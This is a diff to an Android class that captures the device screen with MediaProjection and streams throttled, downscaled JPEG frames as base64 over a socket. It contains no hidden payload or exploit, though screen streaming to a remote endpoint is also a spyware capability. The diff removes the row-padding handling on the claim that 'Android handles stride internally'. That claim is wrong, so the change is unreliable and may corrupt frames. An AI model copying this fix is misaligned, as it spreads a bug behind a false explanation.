@@ -34,6 +34,7 @@ public class Capture {
     public static ImageReader mImageReader;
     public static ByteArrayOutputStream outputStream;
     private static boolean START = false;
+    private static long lastFrameTime = 0;
 
     @SuppressLint("WrongConstant")
     public static void setup(Socket socket, Context ctx,MediaProjection mProjection,Handler handler,int maxImg){
@@ -45,22 +46,47 @@ public class Capture {
         Point size = new Point();
         display.getRealSize(size);
         //=====[]======
-        width = size.x;
-        height = size.y;
+        //=====[]======
+        // Store Real Size for reference if needed
+        int realWidth = size.x;
+        int realHeight = size.y;
+        
+        // Scale down to 270p-ish (Extreme Stability Mode)
+        int scaleFactor = 4;
+        int scaledW = realWidth / scaleFactor;
+        int scaledH = realHeight / scaleFactor;
+        
+        // ALIGNMENT: Round to nearest multiple of 16
+        width = (scaledW + 15) & ~15;
+        height = (scaledH + 15) & ~15;
+        
+        if (width <= 0) width = 160;
+        if (height <= 0) height = 160;
+        
         dpi = metrics.densityDpi;
 
 
-        // Init Image Reader
+        // Init Image Reader with Scaled Size
         mImageReader = ImageReader.newInstance(width,height, PixelFormat.RGBA_8888,maxImg);
         int flags = DisplayManager.VIRTUAL_DISPLAY_FLAG_OWN_CONTENT_ONLY | DisplayManager.VIRTUAL_DISPLAY_FLAG_PUBLIC;
 
         mProjection.createVirtualDisplay("mir-src",width,height,dpi,flags,mImageReader.getSurface(),null,handler);
 
-
         mImageReader.setOnImageAvailableListener(new ImageReader.OnImageAvailableListener() {
 
             @Override
             public void onImageAvailable(ImageReader imageReader) {
+                // Throttling: Limit to ~5 FPS (200ms) for stability testing
+                long now = System.currentTimeMillis();
+                
+                if ((now - lastFrameTime) < 200) {
+                     try (Image img = mImageReader.acquireLatestImage()) { 
+                         if (img != null) img.close(); 
+                     } catch (Exception e) {}
+                     return;
+                }
+                lastFrameTime = now;
+
                 FileOutputStream fos = null;
                 Bitmap bitmap = null;
                 outputStream = null;
@@ -69,40 +95,44 @@ public class Capture {
                         if (image != null) {
                             Image.Plane[] planes = image.getPlanes();
                             ByteBuffer buffer = planes[0].getBuffer();
-                            int pixelStride = planes[0].getPixelStride();
-                            int rowStride = planes[0].getRowStride();
-                            int rowPadding = rowStride - pixelStride * width;
-
-                            // create bitmap
-                            bitmap = Bitmap.createBitmap(width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888);
+                            
+                            // SIMPLIFIED: Create bitmap directly with virtual display dimensions
+                            // This avoids padding calculation errors that cause SurfaceFlinger crashes
+                            bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
+                            
+                            // Copy pixels directly - Android handles stride internally
+                            buffer.rewind();
                             bitmap.copyPixelsFromBuffer(buffer);
 
+                            // Compress directly (no cropping needed since we used exact dimensions)
                             outputStream = new ByteArrayOutputStream();
-                            bitmap.compress(Bitmap.CompressFormat.JPEG, 100, outputStream);
-                            String encode = Base64.encodeToString(outputStream.toByteArray(),Base64.DEFAULT);
-
-                            socket.emit("img",encode);
-
-
-                            IMAGES_PRODUCED++;
-//                            Log.e(TAG, "captured image: " + IMAGES_PRODUCED);
+                            
+                            // Quality 30 (Safe balance)
+                            boolean success = bitmap.compress(Bitmap.CompressFormat.JPEG, 30, outputStream); 
+                            
+                            // Recycle immediately
+                            bitmap.recycle();
+                            bitmap = null;
+                            
+                            if (success) {
+                                String encode = Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP);
+    
+                                // Payload Safety Check (Max 300KB)
+                                if (encode.length() < 300000 && encode.length() > 0) {
+                                    socket.emit("img", encode);
+                                    IMAGES_PRODUCED++;
+                                } else {
+                                    Log.e(TAG, "Frame dropped: Invalid size (" + encode.length() + ")");
+                                }
+                            } else {
+                                Log.e(TAG, "Compression Failed");
+                            }
                         }
                     }
                 } catch (Exception e) {
                     e.printStackTrace();
                 } finally {
-                    if (fos != null) {
-                        try {
-                            fos.close();
-                        } catch (IOException ioe) {
-                            ioe.printStackTrace();
-                        }
-                    }
-
-                    if (bitmap != null) {
-                        bitmap.recycle();
-                    }
-
+                    // Cleanup
                 }
             }
         },handler);
